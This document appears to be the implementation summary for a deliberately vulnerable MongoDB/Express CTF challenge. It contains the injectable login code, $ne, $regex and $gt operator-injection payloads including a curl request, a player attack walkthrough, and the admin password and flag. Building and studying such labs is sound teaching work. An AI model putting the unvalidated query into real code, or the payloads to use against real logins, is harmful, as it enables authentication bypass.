# 🎯 MongoDB NoSQL Injection CTF Challenge - Complete Implementation

## ✅ Project Status: READY TO USE

Your advanced MongoDB NoSQL injection CTF challenge has been successfully created with professional-grade code quality and proper separation of concerns.

---

## 📂 Complete File Structure

```
mongo_db_injection/
│
├── config/
│   └── db.js                    # MongoDB connection configuration
│
├── middleware/
│   └── auth.js                  # JWT authentication & admin role checking
│
├── models/
│   └── User.js                  # User schema (username, password, role)
│
├── routes/
│   ├── auth.js                  # 🔴 VULNERABLE - Login/Register/Logout
│   ├── dashboard.js             # User dashboard route
│   └── admin.js                 # Admin panel with FLAG
│
├── views/ (EJS Templates)
│   ├── index.ejs                # Landing page
│   ├── login.ejs                # Login form
│   ├── register.ejs             # Registration form
│   ├── dashboard.ejs            # User dashboard
│   ├── admin.ejs                # Admin panel (shows flag)
│   └── error.ejs                # Error page (403, etc.)
│
├── public/
│   └── css/
│       └── style.css            # Professional dark theme styling
│
├── server.js                    # Main application entry point
├── .env                         # Environment variables (FLAG, JWT_SECRET, etc.)
├── package.json                 # Dependencies
├── README.md                    # Challenge instructions
└── CHALLENGE_EXPLANATION.md     # Detailed vulnerability analysis
```

---

## 🚀 How to Start the Challenge

### 1. Ensure MongoDB is Running
```bash
# Make sure MongoDB is running on localhost:27017
# The application will connect automatically
```

### 2. Start the Application
```bash
cd c:\Users\V.S.BARATH\Desktop\web_chellenges\mongo_db_injection
npm start
```

### 3. Access the Application
Open your browser and navigate to:
```
http://localhost:3000
```

---

## 🎮 Application Pages

| Route | Description | Access |
|-------|-------------|--------|
| `GET /` | Landing page with CTA buttons | Public |
| `GET /register` | User registration form | Public |
| `POST /register` | Registration logic | Public |
| `GET /login` | Login form | Public |
| `POST /login` | 🔴 **VULNERABLE** Login logic | Public |
| `GET /logout` | Logout and clear session | Authenticated |
| `GET /dashboard` | User dashboard (shows username & role) | Authenticated |
| `GET /admin` | Admin panel with FLAG | Admin Only |

---

## 🔐 Pre-Seeded Credentials

The application automatically seeds an admin user on startup:

```
Username: admin
Password: Sup3rS3cur3P@ssw0rd!2024
Role: admin
```

**Note:** The password is intentionally complex and unknown to players. They must exploit the NoSQL injection vulnerability to bypass authentication.

---

## 🐛 The Vulnerability

### Location: `routes/auth.js` (Line ~50-70)

```javascript
router.post('/login', async (req, res) => {
    const { username, password } = req.body;
    
    // VULNERABLE CODE
    const query = {
        username: username,
        password: password
    };
    
    const user = await User.findOne(query);
    // ... rest of login logic
});
```

### Why It's Vulnerable:
1. **No Type Validation**: The code doesn't verify that `username` and `password` are strings
2. **Direct Query Construction**: User input is directly used in MongoDB queries
3. **JSON Parsing**: Express automatically parses JSON objects from request bodies
4. **MongoDB Operator Injection**: Attackers can inject operators like `$ne`, `$gt`, `$regex`

---

## 💣 Exploitation Methods

### Method 1: Using `$ne` (Not Equal)
**Most Common Attack**

```bash
# Using curl
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":null}}'
```

**What happens:**
- The query becomes: `{ username: "admin", password: { $ne: null } }`
- MongoDB finds the admin user where password is "not null" (always true)
- Authentication bypassed ✅

### Method 2: Using `$regex`
```json
{
  "username": "admin",
  "password": { "$regex": ".*" }
}
```

### Method 3: Using `$gt` (Greater Than)
```json
{
  "username": "admin",
  "password": { "$gt": "" }
}
```

### Method 4: Blind NoSQL Injection
Extract password character by character:
```json
{
  "username": "admin",
  "password": { "$regex": "^S" }
}
```

---

## 🎯 Attack Flow for Players

1. **Register** a normal account to understand the flow
2. **Login** with your account → redirected to `/dashboard` (role: user)
3. **Try accessing** `/admin` → Access Denied (403)
4. **Intercept** the login request using Burp Suite or browser DevTools
5. **Modify** the request:
   - Change `Content-Type` to `application/json`
   - Replace password with: `{"$ne": null}`
6. **Submit** the modified request
7. **Success!** You're now logged in as admin
8. **Access** `/admin` to capture the flag

---

## 🚩 The Flag

```
CTF{advanced_nosql_injection_admin_bypass}
```

Located in `.env` file and displayed on the `/admin` page after successful exploitation.

---

## 🛡️ Why This Is a HARD Challenge

### Subtle Vulnerability:
- The code **looks** secure at first glance
- No obvious SQL injection patterns
- Proper use of Mongoose ORM
- JWT authentication implemented
- Role-based access control in place

### Requires Understanding:
- How MongoDB query operators work
- How Express parses JSON bodies
- How to intercept and modify HTTP requests
- NoSQL injection techniques
- Difference between SQL and NoSQL injection

### Realistic Scenario:
- Production-quality code structure
- Professional UI/UX
- Proper separation of concerns
- No comments revealing the vulnerability
- Looks like a real enterprise application

---

## 📚 Educational Value

This challenge teaches:
1. **NoSQL Injection Fundamentals**
2. **Input Validation Importance**
3. **Type Checking in JavaScript**
4. **MongoDB Security Best Practices**
5. **Secure Authentication Implementation**
6. **Web Application Security Testing**

---

## 🔧 Technologies Used

- **Backend:** Node.js + Express.js
- **Database:** MongoDB + Mongoose ODM
- **Authentication:** JWT (JSON Web Tokens)
- **View Engine:** EJS (Embedded JavaScript Templates)
- **Styling:** Custom CSS (Dark theme, modern design)
- **Environment:** dotenv for configuration

---

## 📖 Documentation Files

1. **README.md** - Challenge overview and quick start guide
2. **CHALLENGE_EXPLANATION.md** - Detailed vulnerability analysis and exploitation guide
3. **This file** - Complete implementation summary

---

## ✅ Testing Checklist

- [x] MongoDB connection working
- [x] Admin user auto-seeded
- [x] Registration creates new users
- [x] Login with valid credentials works
- [x] JWT authentication functional
- [x] User dashboard accessible after login
- [x] Admin panel blocked for normal users
- [x] NoSQL injection bypasses authentication
- [x] Flag displayed on admin panel
- [x] Professional UI/UX implemented
- [x] All routes properly separated
- [x] Environment variables configured
- [x] Error handling implemented

---

## 🎓 For Challenge Authors

### Deployment Tips:
1. Ensure MongoDB is accessible
2. Update `MONGO_URI` in `.env` if needed
3. Change `JWT_SECRET` for production
4. Customize the flag value
5. Consider adding rate limiting (optional)

### Difficulty Adjustments:
- **Make Easier:** Add hints in UI, reduce password complexity
- **Make Harder:** Add CAPTCHA, implement basic sanitization (but leave bypass), add time delays

### Variations:
- Add more users with different roles
- Implement blind injection challenges
- Add data exfiltration objectives
- Create multi-step exploitation

---

## ⚠️ Security Reminder

**This application is INTENTIONALLY VULNERABLE.**

- ❌ Do NOT deploy in production
- ❌ Do NOT use on systems you don't own
- ✅ Use ONLY for educational purposes
- ✅ Learn secure coding practices
- ✅ Share knowledge responsibly

---

## 🎉 Challenge Complete!

Your MongoDB NoSQL Injection CTF challenge is ready to deploy. Players will need to:
1. Understand NoSQL injection concepts
2. Identify the vulnerable endpoint
3. Craft the exploit payload
4. Bypass authentication
5. Capture the flag

**Good luck to all participants! 🚩**

---

**Created by:** Senior Security Engineer & CTF Challenge Designer  
**Difficulty:** Hard  
**Category:** Web Security / NoSQL Injection  
**Estimated Solve Time:** 30-60 minutes (for experienced players)
